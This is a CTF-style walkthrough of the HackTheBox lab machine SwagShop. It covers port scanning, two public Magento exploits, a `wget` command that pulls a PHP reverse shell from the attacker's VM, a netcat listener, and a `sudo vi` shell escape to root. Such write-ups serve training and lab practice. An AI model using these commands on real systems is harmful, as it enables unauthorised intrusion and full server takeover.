---
title: HackTheBox - SwagShop
author: solidgoat
date: 2022-10-11 11:33:00 +0800
categories: [HackTheBox, Machines]
tags: [linux, ctf, hackthebox, htb, walkthrough]
image:
  path: /assets/img/posts/SwagShop/htb-swagshop-logo.png
  width: 800
  height: 500
  alt: Walkthrough of SwagShop from HackTheBox
---

## Overview

This is marked as an easy box. It's running Ubuntu and has an outdated version of Magento eCommerce platform that has a few public exploits that will allow us remote code execution to get a reverse shell, then eventually root access by escaping `vi` with `sudo`.

### Tools Used

* Nmap
* Gobuster
* Python 3.10

## Enumeration

### Port Scan
Running an Nmap TCP scan on against all ports (`0 - 65536`) on `10.10.10.140` shows ports `80` (HTTP) and `22` (SSH) to be opened.

Additionally, the site hosted on port `80` has a host header of `http://swagshop.htb/`, so we'll need to update `/etc/hosts` file in order to navigate to it.

```
# Nmap 7.92 scan initiated Mon Oct 10 10:35:19 2022 as: nmap -v -T4 -Pn -n -O --osscan-limit -sC -sV -p- --open -oA nmap-tcp-all-full --min-parallelism 100 --min-rate 2000 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Did not follow redirect to http://swagshop.htb/
|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/10%OT=22%CT=1%CU=38934%PV=Y%DS=2%DC=I%G=Y%TM=63442D
OS:C4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST
OS:11NW7%O6=M539ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=g">IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 0.162 days (since Mon Oct 10 06:42:03 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 10 10:35:48 2022 -- 1 IP address (1 host up) scanned in 29.65 seconds
```

### Information Gathering

Directory and file search using `gobuster` reveals some interesting files.
```
/install.php          (Status: 200) [Size: 44]
/index.php            (Status: 200) [Size: 16593]
/favicon.ico          (Status: 200) [Size: 1150]
/.htaccess            (Status: 403) [Size: 296]
/LICENSE_AFL.txt      (Status: 200) [Size: 10421]
/LICENSE.html         (Status: 200) [Size: 10679]
/api.php              (Status: 200) [Size: 37]
/.html                (Status: 403) [Size: 292]
/.php                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htm                 (Status: 403) [Size: 291]
/LICENSE.txt          (Status: 200) [Size: 10410]
/cron.php             (Status: 200) [Size: 0]
/RELEASE_NOTES.txt    (Status: 200) [Size: 585086]
/.htpasswds           (Status: 403) [Size: 297]
/.htgroup             (Status: 403) [Size: 295]
/wp-forum.phps        (Status: 403) [Size: 300]
/php.ini.sample       (Status: 200) [Size: 886]
/.htaccess.bak        (Status: 403) [Size: 300]
/index.php.sample     (Status: 200) [Size: 2366]
/.htuser              (Status: 403) [Size: 294]
/.ht                  (Status: 403) [Size: 290]
/.htc                 (Status: 403) [Size: 291]
```

Interesting files from the results:
* `index.php`
* `RELEASE_NOTES.txt`
* `api.php`

Possible version information when navigating to `http://swagshop.htb/RELEASE_NOTES.txt` - Magento might be `1.7.0.x`.

<img src="/assets/img/posts/SwagShop/magento-release-notes.png">

However, the copyright information at the bottom of the homepage shows the year 2014. A quick web search suggests that this version of Magento might be `1.9.x`.

<img src="/assets/img/posts/SwagShop/magento-copyright.png">

## Initial Foothold

There are several public exploits for Magento, but two in particular seemed to be appropriate for this version. One appears to create an admin user on the management portion of the site through a SQL injection (37977.py), and the other is able to run code on the backend server (37811.py) using an authenticated user.

* Magento eCommerce - Remote Code Execution
    * hxxps://www.exploit-db.com/exploits/37977
* Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
    * hxxps://www.exploit-db.com/exploits/37811

### Exploit Script 37977.py (SQLi)

Because the exploit was written in Python 2.7, some modifications needed to be made in order for it to be run with Python 3.10 (latest version at the time of writing this).

Update `target` variable on `Line 31`.*

*(not related to Python versions, but for exploit functionality)

<img src="/assets/img/posts/SwagShop/exploit-37977-code-changes-1.png" width="70%" height="70%">

The `pfilter` variable on `Line 56` needs to be byte-encoded. And all the `print` functions needed to be enclosed in paranthesis on `lines 59 - 62`.

<img src="/assets/img/posts/SwagShop/exploit-37977-code-changes-2.png">

Successful execution of the script shows we now have administrative privileges to the management portal.

<img src="/assets/img/posts/SwagShop/exploit-37977-execution.png" width="70%" height="70%">

<img src="/assets/img/posts/SwagShop/magento-admin-portal.png">

Additionally, we now can confirm the version of Magento to be 1.9.0.0.

<img src="/assets/img/posts/SwagShop/magento-admin-portal-version.png">

We need to be able to run server-side code in order to gain remote access. I didn't see a way to upload a custom php file while navigating around the management portal. However, since we now have an admin account within the management portal, we can run the next exploit.

### Exploit Script 37811.py (Authenticated RCE)

Same as the first exploit. This was also written in Python 2.7, so it needed to be modified in order to run with Python 3.10 (latest version at the time of writing this).

Variables in `Lines 32` and `33`.*

And `Lines 35` can be found in `/app/etc/local.xml` since the `/app` directory is browseable externally.*

*(not related to Python versions, but for exploit functionality)

<img src="/assets/img/posts/SwagShop/exploit-37811-code-changes-1.png">

Byte endcoding and decoding for lines: `60`, `68`, `71`, `72`, `74`

Print function on `Line 81`.

<img src="/assets/img/posts/SwagShop/exploit-37811-code-changes-2.png">

Running the exploit with a simple OS command (`uname -a`), it appears we do have remote code execution on the backend server.

<img src="/assets/img/posts/SwagShop/exploit-37811-execution.png">

I wasn't able to get a reverse shell directly from the exploit. I assume it might have been because of the encoding and decoding of the different byte strings because the command outputs are all prefixed with a `b'` But I was able to instruct the server to download a reverse shell file that I was hosting from my attacking VM.

After modifying the php reverse shell with my IP and port, I launched a simple Python web server using the following command: `python3 -m http.server 80`

Next I reran the exploit, using `wget http://10.10.14.2/shell.php` to download the reverse shell file from my attacking VM (`10.10.14.2`), which would then be stored in the root of the `/var/www/html/` directory of the target server.

<img src="/assets/img/posts/SwagShop/exploit-37811-execution-upload-shell.png">

I then triggered the reverse shell by navigating to that webpage (`http://swagshop.htb/index.php/shell.php`) while also running my listener on my attacking VM (`nc 4444 -lvnp`)

I successfully obtained remote access to low-level user (`www.data`) access and the `user.txt` flag.

<img src="/assets/img/posts/SwagShop/user-flag.png" width="50%" height="50%">

## Privilege Escalation

Priviledge escalation was relatively straightforward. Executing `sudo -l` showed that the `www-data` was able to run `/usr/bin/vi` against anything within the `/var/www/html/*` directory with `NOPASSWD`.

<img src="/assets/img/posts/SwagShop/sudo-l.png" width="70%" height="70%">

I was able to drop into a root shell by runnng `sudo /usr/bin/vi /var/www/html/test.txt`.

Then this while within `vi` to launch a shell as the `root` user.
```
:set shell=/bin/sh
:shell
```
<img src="/assets/img/posts/SwagShop/root-flag.png" width="50%" height="50%">